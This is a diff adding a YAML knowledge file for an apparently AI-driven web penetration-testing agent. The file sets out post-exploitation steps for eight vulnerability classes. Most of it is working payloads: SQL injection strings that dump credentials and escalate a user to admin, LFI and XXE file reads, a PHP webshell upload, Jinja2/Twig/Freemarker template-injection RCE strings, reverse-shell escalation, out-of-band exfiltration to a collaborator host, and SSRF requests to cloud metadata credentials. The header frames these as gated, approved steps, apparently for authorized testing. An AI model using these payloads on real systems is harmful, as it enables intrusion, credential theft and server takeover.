@@ -1,0 +1,109 @@
+# Post-exploitation for WEB vulnerabilities — the "loot" step, as data.
+#
+# WHY THIS IS SEPARATE FROM THE vuln_class_methodology SKILL
+#   The vuln-class methodology proves a primitive is exploitable and is READ-ONLY
+#   by contract ("one version/marker row proves exploitability; do NOT dump tables
+#   or modify data"). Weaponizing a CONFIRMED exploit — dumping the database,
+#   reading a target file, dropping a webshell — READS/MODIFIES the target, so it
+#   is a different phase with a different authorization posture. It runs as a
+#   GATED FOLLOW-ON from an `exploit_confirmed:<class>` fact, through the impactful/
+#   approval lane, never as part of proving the vuln.
+#
+# THIS IS A SKILL
+#   Retrieved by class (common/vuln_skills.postex_for / postex_block, the
+#   get_web_postex tool) and embedded into RAG (etl/load_knowledge_documents.
+#   _render_postex_web) so the planner can recall it. Edit here, not in code.
+#
+# PROOF = REAL EXTRACTED DATA
+#   The objective is DB-COMPUTED / target-resident data that was NOT in the
+#   request (a version string, a table row, file contents, command output) — this
+#   is un-reflectable (defeats the reflection false-positive that dogs a literal
+#   canary) AND is what an outcome-based evaluator actually scores.
+
+version: 1
+
+classes:
+  sqli:
+    objective: "Extract data (or modify it) through the confirmed SQL injection."
+    weaponize: >-
+      Fingerprint first: extract a DB-COMPUTED value the request never contained —
+      ' UNION SELECT version(),current_user,database()-- , or error-based
+      updatexml(1,concat(0x7e,(select version()),0x7e),1). Then reach the objective:
+      dump creds (' UNION SELECT group_concat(user_login,0x3a,user_pass) FROM wp_users--
+      / FROM users), read the target/secret table (' UNION SELECT message FROM secret--),
+      or read a file if FILE priv (' UNION SELECT LOAD_FILE('/path/to/secret')--). To
+      MODIFY: stacked query '; UPDATE users SET role='admin' WHERE id=1-- (only if the
+      objective is data modification). Match the injection style already confirmed
+      (error/union/boolean/time) and the DB fingerprint. Prefer sqlmap
+      --batch --dump -T <table> when a manual UNION is fiddly.
+    proof: "DB-computed data in the response (version / current_user / real table rows) that was never in the request."
+
+  lfi:
+    objective: "Read the target file(s) through the confirmed LFI / path traversal."
+    weaponize: >-
+      Confirm arbitrary read with a known file (?file=../../../../etc/passwd), then read
+      the OBJECTIVE path (the secret/flag file, config with DB creds, an app source file
+      that leaks a key). PHP wrappers when a raw read is filtered:
+      php://filter/convert.base64-encode/resource=index.php (decode the base64), or
+      data:// / expect:// for RCE where enabled. Log-poison to RCE only if the objective
+      needs code exec.
+    proof: "Target file contents in the response (e.g. the secret/flag, /etc/passwd, DB credentials)."
+
+  file_upload:
+    objective: "Achieve RCE (or drop the objective artifact) via the confirmed arbitrary upload."
+    weaponize: >-
+      Upload a minimal webshell to a web-served, executable path
+      (<?php system($_GET['c']); ?> as shell.php; bypass filters with double
+      extensions, content-type spoofing, or a .htaccess handler), then request it:
+      GET /uploads/shell.php?c=id. If the objective is to run a specific binary, exec
+      it (?c=/tmp/pwn). Confirm the write path from the upload response or a predictable
+      uploads dir.
+    proof: "Command output from the uploaded shell (uid=/gid= from id) or the target binary's effect."
+
+  command_injection:
+    objective: "Run the objective command via the confirmed command injection."
+    weaponize: >-
+      Escalate from proof to the objective: read the target file (; cat /path/secret),
+      run the target binary (; /tmp/pwn), or establish a reverse/bind shell for
+      interactive access if the objective needs it. Use the separator already confirmed
+      (; | && $() backticks) and URL/space bypasses (${IFS}) as needed.
+    proof: "Objective command output in the response (file contents, id, or the binary's effect)."
+
+  ssti:
+    objective: "Reach RCE / read data through the confirmed template injection."
+    weaponize: >-
+      From the confirmed engine, jump to RCE: Jinja2
+      {{ cycler.__init__.__globals__.os.popen('id').read() }} or
+      {{ config.__class__.__init__.__globals__['os'].popen('cat /path/secret').read() }};
+      Twig {{ ['id']|filter('system') }}; Freemarker
+      <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}. Run the objective
+      command / read the objective file.
+    proof: "Command output or target file contents rendered in the response (never a literal we sent)."
+
+  xxe:
+    objective: "Read the target file / SSRF via the confirmed XXE."
+    weaponize: >-
+      In-band: <!DOCTYPE r [<!ENTITY x SYSTEM 'file:///path/secret'>]> then reference &x;
+      in a reflected field. Filtered/binary: PHP base64 wrapper
+      (php://filter/convert.base64-encode/resource=/path). Blind/OOB: an external DTD that
+      exfils the file to a collaborator you control. Or hit an internal service (SSRF) if
+      that is the objective.
+    proof: "Target file contents (or the internal service's response) in the reply / OOB callback."
+
+  idor:
+    objective: "Access the other user's / object's data via the confirmed IDOR."
+    weaponize: >-
+      Enumerate the identifier that was confirmed manipulable (increment/replace the id,
+      GUID, or filename) to reach the OBJECTIVE record — the admin's data, another
+      tenant's file, the secret object. Batch a small range to demonstrate scope.
+    proof: "Another principal's data returned (the objective record/file that the current user should not see)."
+
+  ssrf:
+    objective: "Reach the internal target via the confirmed SSRF."
+    weaponize: >-
+      Point the confirmed SSRF at the objective: an internal service
+      (http://127.0.0.1:<port>/), a cloud metadata endpoint
+      (http://169.254.169.254/latest/meta-data/ or the GCP/Azure equivalent for creds),
+      or a file (file:///path/secret where the fetcher allows it). Use gopher:// to speak
+      to a non-HTTP internal service if the objective needs it.
+    proof: "The internal resource's response / metadata credentials returned via the vulnerable fetcher."
